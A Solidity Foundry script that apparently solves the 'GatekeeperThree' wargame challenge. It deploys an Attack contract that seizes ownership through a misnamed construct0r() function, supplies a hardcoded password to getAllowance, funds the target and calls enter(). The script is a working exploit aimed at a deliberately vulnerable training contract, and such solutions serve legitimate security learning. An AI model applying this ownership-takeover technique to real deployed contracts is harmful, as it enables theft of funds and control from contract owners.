// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/GatekeeperThree.sol";

contract GatekeeperThreeScript is Script {
    GatekeeperThree public target;
    SimpleTrick public trick_;
    // 0x0000000000000000000000000000000000000000000000000000000068eca868
    function setUp() public {
        target = GatekeeperThree(payable(0x50486426dC23dBC7Fe99C02E9878B0c654c02BFB));
    }

    function run() public {
        vm.startBroadcast();

        payable(address(target)).send(0.01 ether);
        Attack a = new Attack{value: 0.002 ether}(target);
        a.a();

        vm.stopBroadcast();
    }

}

contract Attack {

    GatekeeperThree public target;
    SimpleTrick public trick_;

    constructor(GatekeeperThree target_) payable {
        target = target_;
        trick_ = SimpleTrick(0x02c12a76ff5dAf9Ada34573e4608F3BEA4F6E3B5);
    }

    function a() external payable {
        target.construct0r();
        console.log("owner: ", target.owner());
        target.getAllowance(uint256(0x0000000000000000000000000000000000000000000000000000000068eca868));
        target.enter();
        console.log("entrant", target.entrant());
    }
}